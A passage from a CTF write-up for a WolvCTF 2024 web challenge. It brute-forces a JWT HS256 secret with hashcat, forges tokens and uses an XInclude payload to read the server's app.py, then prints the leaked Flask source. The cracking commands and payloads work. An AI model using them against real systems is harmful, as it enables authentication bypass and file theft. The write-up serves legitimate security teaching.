+</span></span></code></pre></div><p>The last section is the SIGNATURE.</p><p>The signature is the aqua text on the left:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl>bo6oHNQHDYUNg4wOgLsd7Ey2aKsNUPopUuDmagLpCEU
+</span></span></code></pre></div><p>This is also base64 but it decodes into binary so you can&rsquo;t read it on the right.</p><p>jwt.io provides a box on the lower right where, if you know the signing secret then you can enter it.</p><p>The idea behind a JWT is there there is some secret that is used to cryptographically create a signature from the HEADER/PAYLOAD. That way, if someone tries to send your website and altered JWT (by hand-editing the PAYLOAD), then they won&rsquo;t know the secret and so the signature they send won&rsquo;t &ldquo;match&rdquo; the HEADER/PAYLOAD and your server can reject it.</p><h3 id=cracking-jwts>Cracking JWTs</h3><p>If you don&rsquo;t know the secret, but want to find it out anyway, then you have to &ldquo;crack&rdquo; the secret.</p><p>There are lots of websites that talk about JWT cracking.  There are several possible approaches that all depend on the type of algorithm used to perform the signing.</p><p>If the algorithm is HS### (such as our HS256), then after doing some online research, there are only a few options available to try:</p><ul><li>&ldquo;alg&rdquo;: &ldquo;none&rdquo;</li></ul><p>  - See the &ldquo;Removing the signature&rdquo; section here: <a href=https://debricked.com/blog/json-web-tokens/>https://debricked.com/blog/json-web-tokens/</a></p><ul><li><p>Dictionary attack: Looking up the secret in an online word list</p></li><li><p>Bruteforce attack: try all 1 character strings, then try all 2 character strings, etc&mldr;</p></li></ul><p>See &ldquo;Cracking weak shared secrets&rdquo; on this page:</p><p><a href=https://infosecwriteups.com/attacks-on-json-web-token-jwt-278a49a1ad2e>https://infosecwriteups.com/attacks-on-json-web-token-jwt-278a49a1ad2e</a></p><p>With some experience, it is easy to try to alg/none attack here but that won&rsquo;t work with this challenge.</p><p>Next, you could try the &ldquo;rockyou&rdquo; word list (google it) and you&rsquo;d find that doesn&rsquo;t help either.</p><p>That leaves Brute Forcing.</p><p>The hint that the JWT secret was not in any word list was released a few hours after the CTF event started based on user feedback.</p><p>There are several tools available to help crack JWTs.  Here I&rsquo;m going to use hashcat.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl>hashcat --potfile-disable -a 3 -m 16500 jwt.txt -O
+</span></span></code></pre></div><p>Here are the options explained:</p><ul><li><p><strong>&ndash;potfile-disable</strong>: hashcat keeps a record of cracked hashes so if you run it a second time &ldquo;nothing&rdquo; seems to happen. This option makes it so you can run many times in a row as if it were the &ldquo;first time&rdquo;</p></li><li><p><strong>-a 3</strong>: attack mode = <strong>brute force</strong></p></li><li><p><strong>-m 16500</strong>: tells hashcat that we are trying to crack a JWT</p></li></ul><p>  - If you didn&rsquo;t know this, run <code>hashcat --help</code> and it will list the 8 million formats it supports</p><ul><li><p><strong>jwt.txt</strong>: the local file containing the full JWT (that you pasted into jwt.io)</p></li><li><p><strong>-O</strong>: optimize (honestly not sure if this actually makes it go faster in practice)</p></li></ul><p>Running this will cause a bunch of stuff to scroll by.  If it succeeds, you&rsquo;ll see the last bit of text output will look like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln> 1</span><span class=cl>
+</span></span><span class=line><span class=ln> 2</span><span class=cl>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiPGRhdGE-PHVzZXJuYW1lPnNhbTwvdXNlcm5hbWU-PC9kYXRhPiJ9.bo6oHNQHDYUNg4wOgLsd7Ey2aKsNUPopUuDmagLpCEU:mstzt
+</span></span><span class=line><span class=ln> 3</span><span class=cl>
+</span></span><span class=line><span class=ln> 4</span><span class=cl>  
+</span></span><span class=line><span class=ln> 5</span><span class=cl>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>Session..........: hashcat
+</span></span><span class=line><span class=ln> 7</span><span class=cl>
+</span></span><span class=line><span class=ln> 8</span><span class=cl>Status...........: Cracked
+</span></span><span class=line><span class=ln> 9</span><span class=cl>
+</span></span><span class=line><span class=ln>10</span><span class=cl>Hash.Mode........: 16500 (JWT (JSON Web Token))
+</span></span><span class=line><span class=ln>11</span><span class=cl>
+</span></span><span class=line><span class=ln>12</span><span class=cl>Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiPG...gLpCEU
+</span></span><span class=line><span class=ln>13</span><span class=cl>
+</span></span><span class=line><span class=ln>14</span><span class=cl>Time.Started.....: Sun Mar 17 15:12:24 2024 (7 secs)
+</span></span><span class=line><span class=ln>15</span><span class=cl>
+</span></span><span class=line><span class=ln>16</span><span class=cl>Time.Estimated...: Sun Mar 17 15:12:31 2024 (0 secs)
+</span></span><span class=line><span class=ln>17</span><span class=cl>
+</span></span><span class=line><span class=ln>18</span><span class=cl>Kernel.Feature...: Pure Kernel
+</span></span><span class=line><span class=ln>19</span><span class=cl>
+</span></span><span class=line><span class=ln>20</span><span class=cl>Guess.Mask.......: ?1?2?2?2?2 [5]
+</span></span><span class=line><span class=ln>21</span><span class=cl>
+</span></span><span class=line><span class=ln>22</span><span class=cl>Guess.Charset....: -1 ?l?d?u, -2 ?l?d, -3 ?l?d*!$@_, -4 Undefined
+</span></span><span class=line><span class=ln>23</span><span class=cl>
+</span></span><span class=line><span class=ln>24</span><span class=cl>Guess.Queue......: 5/15 (33.33%)
+</span></span><span class=line><span class=ln>25</span><span class=cl>
+</span></span><span class=line><span class=ln>26</span><span class=cl>Speed.#3.........:  4888.1 kH/s (6.32ms) @ Accel:64 Loops:31 Thr:1 Vec:4
+</span></span><span class=line><span class=ln>27</span><span class=cl>
+</span></span><span class=line><span class=ln>28</span><span class=cl>Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+</span></span><span class=line><span class=ln>29</span><span class=cl>
+</span></span><span class=line><span class=ln>30</span><span class=cl>Progress.........: 36029440/104136192 (34.60%)
+</span></span><span class=line><span class=ln>31</span><span class=cl>
+</span></span><span class=line><span class=ln>32</span><span class=cl>Rejected.........: 0/36029440 (0.00%)
+</span></span><span class=line><span class=ln>33</span><span class=cl>
+</span></span><span class=line><span class=ln>34</span><span class=cl>Restore.Point....: 580608/1679616 (34.57%)
+</span></span><span class=line><span class=ln>35</span><span class=cl>
+</span></span><span class=line><span class=ln>36</span><span class=cl>Restore.Sub.#3...: Salt:0 Amplifier:0-31 Iteration:0-31
+</span></span><span class=line><span class=ln>37</span><span class=cl>
+</span></span><span class=line><span class=ln>38</span><span class=cl>Candidate.Engine.: Device Generator
+</span></span><span class=line><span class=ln>39</span><span class=cl>
+</span></span><span class=line><span class=ln>40</span><span class=cl>Candidates.#3....: saruk -&gt; 7m3j0
+</span></span><span class=line><span class=ln>41</span><span class=cl>
+</span></span><span class=line><span class=ln>42</span><span class=cl>Hardware.Mon.SMC.: Fan0: 33%, Fan1: 33%
+</span></span><span class=line><span class=ln>43</span><span class=cl>
+</span></span><span class=line><span class=ln>44</span><span class=cl>Hardware.Mon.#3..: Temp: 58c
+</span></span><span class=line><span class=ln>45</span><span class=cl>
+</span></span><span class=line><span class=ln>46</span><span class=cl>  
+</span></span><span class=line><span class=ln>47</span><span class=cl>
+</span></span><span class=line><span class=ln>48</span><span class=cl>Started: Sun Mar 17 15:12:18 2024
+</span></span><span class=line><span class=ln>49</span><span class=cl>
+</span></span><span class=line><span class=ln>50</span><span class=cl>Stopped: Sun Mar 17 15:12:32 2024
+</span></span></code></pre></div><p>You can see it took about 14 seconds.</p><p>You might be wondering WHERE is the secret that it found?</p><p>It really is not obvious in this output.</p><p>Notice the <strong>mstzt</strong> to the right of the token in the first line of the above output?</p><p>That is the HS256 secret!</p><p><strong>Note</strong>: In practice, I personally do try brute forcing on JWTs after first trying alg/none and rockyou.txt.  I tend to let it run at most 20 minutes figuring the author wouldn&rsquo;t want me to spend any more time than that. I understand others might have a different perspective here. This is why the hint was added.</p><h3 id=xml-injection>XML Injection</h3><p>Now that we know the secret, we can use jwt.io or write python code to generate forged tokens with any PAYLOAD we like.</p><p>As an example, here I replaced &ldquo;sam&rdquo; with &ldquo;jane&rdquo; after putting the secret into the lower-right box.</p><p><strong>Note</strong>: Be sure to clear out the EXISTING text in the lower-right window before you paste in the secret.</p><p><img src=/assets/posts/wolvctf2024/image-20240317153604505.png alt=image-20240317153604505></p><p>If you take the forged token on the left and overwrite your existing cookie with this new value, then <code>/welcome</code> will say &ldquo;Welcome jane&rdquo;</p><p>Of course, this doesn&rsquo;t help us.</p><p>The experienced contestant will piece together the following facts:</p><ul><li><p>we are trying to read /app/app.py from the server</p></li><li><p>we have the ability to send XML of our choosing to the server and PART of that XML content is echoed back to us</p></li></ul><p>and reasonably consider the following:</p><ul><li><p>XXE (XML External Entity) attack</p></li><li><p>SSTI (Server Side Template Injection)</p></li></ul><p>There are lots of resources online to learn more about these attacks.</p><p>If you try SSTI, you will see it does not help.</p><p>If you try XXE, here is one resource:</p><p><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection</a></p><p>You might try XML like the following:</p><p><strong>Note</strong>: You can use python&rsquo;s json module to format the xml payload to JSON string</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln> 1</span><span class=cl>
+</span></span><span class=line><span class=ln> 2</span><span class=cl>&lt;?xml version=&#34;1.0&#34;?&gt;
+</span></span><span class=line><span class=ln> 3</span><span class=cl>
+</span></span><span class=line><span class=ln> 4</span><span class=cl>&lt;!DOCTYPE data [
+</span></span><span class=line><span class=ln> 5</span><span class=cl>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>&lt;!ENTITY file SYSTEM &#34;file:///app/app.py&#34;&gt;
+</span></span><span class=line><span class=ln> 7</span><span class=cl>
+</span></span><span class=line><span class=ln> 8</span><span class=cl>]&gt;
+</span></span><span class=line><span class=ln> 9</span><span class=cl>
+</span></span><span class=line><span class=ln>10</span><span class=cl>&lt;data&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;/data&gt;
+</span></span></code></pre></div><p>If we make this all one line and deal with quoting escaping, here is what a jwt.io PAYLOAD might look like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl>{
+</span></span><span class=line><span class=ln>3</span><span class=cl>
+</span></span><span class=line><span class=ln>4</span><span class=cl>  &#34;data&#34;: &#34;&lt;?xml version=\&#34;1.0\&#34;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY file SYSTEM \&#34;file:///app/app.py\&#34;&gt;]&gt;&lt;data&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;/data&gt;&#34;
+</span></span><span class=line><span class=ln>5</span><span class=cl>
+</span></span><span class=line><span class=ln>6</span><span class=cl>}
+</span></span></code></pre></div><p>This produces a JWT like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiPD94bWwgdmVyc2lvbj1cIjEuMFwiPz48IURPQ1RZUEUgZGF0YSBbPCFFTlRJVFkgZmlsZSBTWVNURU0gXCJmaWxlOi8vL2FwcC9hcHAucHlcIj5dPjxkYXRhPjx1c2VybmFtZT4mZmlsZTs8L3VzZXJuYW1lPjwvZGF0YT4ifQ.A_oxB1nuypCU7nDlHWjlfiBme9Aqvq7kSzsi91cSZFk
+</span></span></code></pre></div><p>If we try this as our cookie value we get this: (here I&rsquo;m using Burp&rsquo;s Repeater functionality)</p><p><img src=/assets/posts/wolvctf2024/image-20240317155705413.png alt=image-20240317155705413></p><p>It is telling us that entity references (like the <code>&amp;file;</code>) are not allowed.</p><p>If we knew XML even better and tried to use something called &ldquo;Parameter Entity&rdquo; which start with a <code>%</code> symbol, we&rsquo;d find those are not allowed either.</p><p>So&mldr; what do to???</p><p>In the same XXE link above, there is a section labeled: <strong>XInclude attacks</strong></p><p>It turns out this is an alternative approach when XML entities are not allowed.  Or&mldr; sometimes XML entities are allowed BUT they are not expanded.</p><p>To mimic the example from this web page, let&rsquo;s try the following attack (all one line)</p><p>You only want to include the <code>&lt;username></code> element in the XML data and remove the foo element from the original payload</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl>&lt;data&gt;&lt;username&gt;&lt;xi:include xmlns:xi=&#34;http://www.w3.org/2001/XInclude&#34; parse=&#34;text&#34; href=&#34;file:///app/app.py&#34;/&gt;&lt;/username&gt;&lt;/data&gt;
+</span></span></code></pre></div><p><strong>Note</strong>: The <code>parse="text"</code> is really REALLY important.  It tells the XML processor to NOT try to parse the included content as XML.</p><p>Our updated PAYLOAD will be:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl>{
+</span></span><span class=line><span class=ln>3</span><span class=cl>
+</span></span><span class=line><span class=ln>4</span><span class=cl>  &#34;data&#34;: &#34;&lt;data&gt;&lt;username&gt;&lt;xi:include xmlns:xi=\&#34;http://www.w3.org/2001/XInclude\&#34; parse=\&#34;text\&#34; href=\&#34;file:///app/app.py\&#34;/&gt;&lt;/username&gt;&lt;/data&gt;&#34;
+</span></span><span class=line><span class=ln>5</span><span class=cl>
+</span></span><span class=line><span class=ln>6</span><span class=cl>}
+</span></span></code></pre></div><p>If we use jwt.io to forge this token and sent it with Burp Repeater, we get this:</p><p><img src=/assets/posts/wolvctf2024/image-20240317160930297.png alt=image-20240317160930297></p><p>We were able to read the <code>/app/app.py</code> file!</p><p><strong>Note</strong>: This will be HTML encoded so take this output and find an online HTML decoder.</p><p>After HTML decoding, we get this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=ln>  1</span><span class=cl>
+</span></span><span class=line><span class=ln>  2</span><span class=cl><span class=kn>import</span> <span class=nn>flask</span>
+</span></span><span class=line><span class=ln>  3</span><span class=cl>
+</span></span><span class=line><span class=ln>  4</span><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>url_for</span>
+</span></span><span class=line><span class=ln>  5</span><span class=cl>
+</span></span><span class=line><span class=ln>  6</span><span class=cl><span class=kn>import</span> <span class=nn>jwt</span>
+</span></span><span class=line><span class=ln>  7</span><span class=cl>
+</span></span><span class=line><span class=ln>  8</span><span class=cl><span class=kn>from</span> <span class=nn>lxml</span> <span class=kn>import</span> <span class=n>etree</span>
+</span></span><span class=line><span class=ln>  9</span><span class=cl>
+</span></span><span class=line><span class=ln> 10</span><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=ln> 11</span><span class=cl>
+</span></span><span class=line><span class=ln> 12</span><span class=cl><span class=kn>import</span> <span class=nn>re</span>
+</span></span><span class=line><span class=ln> 13</span><span class=cl>
+</span></span><span class=line><span class=ln> 14</span><span class=cl><span class=kn>import</span> <span class=nn>tempfile</span>
+</span></span><span class=line><span class=ln> 15</span><span class=cl>
+</span></span><span class=line><span class=ln> 16</span><span class=cl>  
+</span></span><span class=line><span class=ln> 17</span><span class=cl>
+</span></span><span class=line><span class=ln> 18</span><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
+</span></span><span class=line><span class=ln> 19</span><span class=cl>
+</span></span><span class=line><span class=ln> 20</span><span class=cl>  
+</span></span><span class=line><span class=ln> 21</span><span class=cl>
+</span></span><span class=line><span class=ln> 22</span><span class=cl><span class=n>FLAG</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;FLAG&#39;</span><span class=p>)</span> <span class=ow>or</span> <span class=s1>&#39;wcft{fake-flag}&#39;</span>
+</span></span><span class=line><span class=ln> 23</span><span class=cl>
+</span></span><span class=line><span class=ln> 24</span><span class=cl><span class=n>FLAGUSER_PASSWORD</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;FLAGUSER_PASSWORD&#39;</span><span class=p>)</span> <span class=ow>or</span> <span class=s1>&#39;fake-password&#39;</span>
+</span></span><span class=line><span class=ln> 25</span><span class=cl>
+</span></span><span class=line><span class=ln> 26</span><span class=cl>  
+</span></span><span class=line><span class=ln> 27</span><span class=cl>
+</span></span><span class=line><span class=ln> 28</span><span class=cl><span class=n>JWT_SECRET</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;JWT_SECRET&#39;</span><span class=p>)</span> <span class=ow>or</span> <span class=s1>&#39;secret&#39;</span>
+</span></span><span class=line><span class=ln> 29</span><span class=cl>
+</span></span><span class=line><span class=ln> 30</span><span class=cl>  
+</span></span><span class=line><span class=ln> 31</span><span class=cl>
+</span></span><span class=line><span class=ln> 32</span><span class=cl><span class=n>JWT_ALG</span> <span class=o>=</span> <span class=s1>&#39;HS256&#39;</span>
+</span></span><span class=line><span class=ln> 33</span><span class=cl>
+</span></span><span class=line><span class=ln> 34</span><span class=cl><span class=n>JWT_COOKIE</span> <span class=o>=</span> <span class=s1>&#39;appdata&#39;</span>
+</span></span><span class=line><span class=ln> 35</span><span class=cl>
+</span></span><span class=line><span class=ln> 36</span><span class=cl>  
+</span></span><span class=line><span class=ln> 37</span><span class=cl>  
+</span></span><span class=line><span class=ln> 38</span><span class=cl>
+</span></span><span class=line><span class=ln> 39</span><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=ln> 40</span><span class=cl>
+</span></span><span class=line><span class=ln> 41</span><span class=cl><span class=k>def</span> <span class=nf>root</span><span class=p>():</span>
+</span></span><span class=line><span class=ln> 42</span><span class=cl>
+</span></span><span class=line><span class=ln> 43</span><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;index.html&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=ln> 44</span><span class=cl>
+</span></span><span class=line><span class=ln> 45</span><span class=cl>  
+</span></span><span class=line><span class=ln> 46</span><span class=cl>  
+</span></span><span class=line><span class=ln> 47</span><span class=cl>
+</span></span><span class=line><span class=ln> 48</span><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/secret-welcome-935734&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=ln> 49</span><span class=cl>
+</span></span><span class=line><span class=ln> 50</span><span class=cl><span class=k>def</span> <span class=nf>secret_welcome</span><span class=p>():</span>
+</span></span><span class=line><span class=ln> 51</span><span class=cl>
+</span></span><span class=line><span class=ln> 52</span><span class=cl>    <span class=c1># There is a linux user named &#39;flaguser&#39;</span>
+</span></span><span class=line><span class=ln> 53</span><span class=cl>
+</span></span><span class=line><span class=ln> 54</span><span class=cl>    <span class=c1># Login here with that username and their linux password.</span>
+</span></span><span class=line><span class=ln> 55</span><span class=cl>
+</span></span><span class=line><span class=ln> 56</span><span class=cl>    <span class=n>auth</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>authorization</span>
+</span></span><span class=line><span class=ln> 57</span><span class=cl>
+</span></span><span class=line><span class=ln> 58</span><span class=cl>  
+</span></span><span class=line><span class=ln> 59</span><span class=cl>
+</span></span><span class=line><span class=ln> 60</span><span class=cl>    <span class=k>if</span> <span class=n>auth</span> <span class=ow>is</span> <span class=kc>None</span> <span class=ow>or</span> <span class=n>auth</span><span class=o>.</span><span class=n>username</span> <span class=o>!=</span> <span class=s1>&#39;flaguser&#39;</span> <span class=ow>or</span> <span class=n>auth</span><span class=o>.</span><span class=n>password</span> <span class=o>!=</span> <span class=n>FLAGUSER_PASSWORD</span><span class=p>:</span>
+</span></span><span class=line><span class=ln> 61</span><span class=cl>
+</span></span><span class=line><span class=ln> 62</span><span class=cl>        <span class=n>resp</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>Response</span><span class=p>(</span><span class=s1>&#39;Please provide the right credentials to get the flag&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=ln> 63</span><span class=cl>
+</span></span><span class=line><span class=ln> 64</span><span class=cl>        <span class=n>resp</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;WWW-Authenticate&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;Basic&#39;</span>
+</span></span><span class=line><span class=ln> 65</span><span class=cl>
+</span></span><span class=line><span class=ln> 66</span><span class=cl>        <span class=k>return</span> <span class=n>resp</span><span class=p>,</span> <span class=mi>401</span>
+</span></span><span class=line><span class=ln> 67</span><span class=cl>
+</span></span><span class=line><span class=ln> 68</span><span class=cl>  
+</span></span><span class=line><span class=ln> 69</span><span class=cl>
+</span></span><span class=line><span class=ln> 70</span><span class=cl>    <span class=k>return</span> <span class=sa>f</span><span class=s1>&#39;Congrats, here is your flag: </span><span class=si>{</span><span class=n>FLAG</span><span class=si>}</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=ln> 71</span><span class=cl>
+</span></span><span class=line><span class=ln> 72</span><span class=cl>  
+</span></span><span class=line><span class=ln> 73</span><span class=cl>  
+</span></span><span class=line><span class=ln> 74</span><span class=cl>
+</span></span><span class=line><span class=ln> 75</span><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/welcome&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=ln> 76</span><span class=cl>
+</span></span><span class=line><span class=ln> 77</span><span class=cl><span class=k>def</span> <span class=nf>welcome</span><span class=p>():</span>
+</span></span><span class=line><span class=ln> 78</span><span class=cl>
+</span></span><span class=line><span class=ln> 79</span><span class=cl>    <span class=n>cookie</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>JWT_COOKIE</span><span class=p>)</span>
+</span></span><span class=line><span class=ln> 80</span><span class=cl>
+</span></span><span class=line><span class=ln> 81</span><span class=cl>  
+</span></span><span class=line><span class=ln> 82</span><span class=cl>
+</span></span><span class=line><span class=ln> 83</span><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>cookie</span><span class=p>:</span>
+</span></span><span class=line><span class=ln> 84</span><span class=cl>
+</span></span><span class=line><span class=ln> 85</span><span class=cl>        <span class=k>return</span> <span class=sa>f</span><span class=s1>&#39;Error: missing </span><span class=si>{</span><span class=n>JWT_COOKIE</span><span class=si>}</span><span class=s1> cookie value&#39;</span>
+</span></span><span class=line><span class=ln> 86</span><span class=cl>
+</span></span><span class=line><span class=ln> 87</span><span class=cl>  
+</span></span><span class=line><span class=ln> 88</span><span class=cl>
+</span></span><span class=line><span class=ln> 89</span><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=ln> 90</span><span class=cl>
+</span></span><span class=line><span class=ln> 91</span><span class=cl>        <span class=n>jwtData</span> <span class=o>=</span> <span class=n>jwt</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>cookie</span><span class=p>,</span> <span class=n>JWT_SECRET</span><span class=p>,</span> <span class=n>algorithms</span><span class=o>=</span><span class=p>[</span><span class=n>JWT_ALG</span><span class=p>])</span>
+</span></span><span class=line><span class=ln> 92</span><span class=cl>
+</span></span><span class=line><span class=ln> 93</span><span class=cl>    <span class=k>except</span><span class=p>:</span>
+</span></span><span class=line><span class=ln> 94</span><span class=cl>
+</span></span><span class=line><span class=ln> 95</span><span class=cl>        <span class=k>return</span> <span class=s1>&#39;Error: unable to decode JWT cookie&#39;</span><span class=p>,</span> <span class=mi>400</span>
+</span></span><span class=line><span class=ln> 96</span><span class=cl>
+</span></span><span class=line><span class=ln> 97</span><span class=cl>  
+</span></span><span class=line><span class=ln> 98</span><span class=cl>
+</span></span><span class=line><span class=ln> 99</span><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>jwtData</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=ln>100</span><span class=cl>
+</span></span><span class=line><span class=ln>101</span><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>data</span><span class=p>:</span>
+</span></span><span class=line><span class=ln>102</span><span class=cl>
+</span></span><span class=line><span class=ln>103</span><span class=cl>        <span class=k>return</span> <span class=s1>&#39;Error: missing data field from decoded JWT&#39;</span><span class=p>,</span> <span class=mi>400</span>
+</span></span><span class=line><span class=ln>104</span><span class=cl>
+</span></span><span class=line><span class=ln>105</span><span class=cl>  
+</span></span><span class=line><span class=ln>106</span><span class=cl>
+</span></span><span class=line><span class=ln>107</span><span class=cl>    <span class=n>xmlText</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>108</span><span class=cl>
+</span></span><span class=line><span class=ln>109</span><span class=cl>    <span class=k>if</span> <span class=s1>&#39;&amp;&#39;</span> <span class=ow>in</span> <span class=n>xmlText</span><span class=p>:</span>
+</span></span><span class=line><span class=ln>110</span><span class=cl>
+</span></span><span class=line><span class=ln>111</span><span class=cl>        <span class=k>return</span> <span class=s1>&#39;Error: No entity references please&#39;</span><span class=p>,</span> <span class=mi>400</span>
+</span></span><span class=line><span class=ln>112</span><span class=cl>
+</span></span><span class=line><span class=ln>113</span><span class=cl>    <span class=k>if</span> <span class=s1>&#39;%&#39;</span> <span class=ow>in</span> <span class=n>xmlText</span><span class=p>:</span>
+</span></span><span class=line><span class=ln>114</span><span class=cl>
+</span></span><span class=line><span class=ln>115</span><span class=cl>        <span class=k>return</span> <span class=s1>&#39;Error: No parameter file entities please&#39;</span><span class=p>,</span> <span class=mi>400</span>
+</span></span><span class=line><span class=ln>116</span><span class=cl>
+</span></span><span class=line><span class=ln>117</span><span class=cl>  
+</span></span><span class=line><span class=ln>118</span><span class=cl>
+</span></span><span class=line><span class=ln>119</span><span class=cl>    <span class=n>tmp</span> <span class=o>=</span> <span class=n>tempfile</span><span class=o>.</span><span class=n>NamedTemporaryFile</span><span class=p>()</span>
+</span></span><span class=line><span class=ln>120</span><span class=cl>
+</span></span><span class=line><span class=ln>121</span><span class=cl>  
+</span></span><span class=line><span class=ln>122</span><span class=cl>
+</span></span><span class=line><span class=ln>123</span><span class=cl>    <span class=c1># Open the file for writing.</span>
+</span></span><span class=line><span class=ln>124</span><span class=cl>
+</span></span><span class=line><span class=ln>125</span><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>tmp</span><span class=o>.</span><span class=n>name</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+</span></span><span class=line><span class=ln>126</span><span class=cl>
+</span></span><span class=line><span class=ln>127</span><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>xmlText</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>128</span><span class=cl>
+</span></span><span class=line><span class=ln>129</span><span class=cl>  
+</span></span><span class=line><span class=ln>130</span><span class=cl>
+</span></span><span class=line><span class=ln>131</span><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=ln>132</span><span class=cl>
+</span></span><span class=line><span class=ln>133</span><span class=cl>        <span class=n>parser</span> <span class=o>=</span> <span class=n>etree</span><span class=o>.</span><span class=n>XMLParser</span><span class=p>(</span><span class=n>resolve_entities</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>134</span><span class=cl>
+</span></span><span class=line><span class=ln>135</span><span class=cl>        <span class=n>xmlDoc</span> <span class=o>=</span> <span class=n>etree</span><span class=o>.</span><span class=n>parse</span><span class=p>(</span><span class=n>tmp</span><span class=o>.</span><span class=n>name</span><span class=p>,</span> <span class=n>parser</span><span class=o>=</span><span class=n>parser</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>136</span><span class=cl>
+</span></span><span class=line><span class=ln>137</span><span class=cl>        <span class=n>xmlDoc</span><span class=o>.</span><span class=n>xinclude</span><span class=p>()</span>
+</span></span><span class=line><span class=ln>138</span><span class=cl>
+</span></span><span class=line><span class=ln>139</span><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=ln>140</span><span class=cl>
+</span></span><span class=line><span class=ln>141</span><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;XML Error:&#39;</span><span class=p>,</span> <span class=n>e</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>142</span><span class=cl>
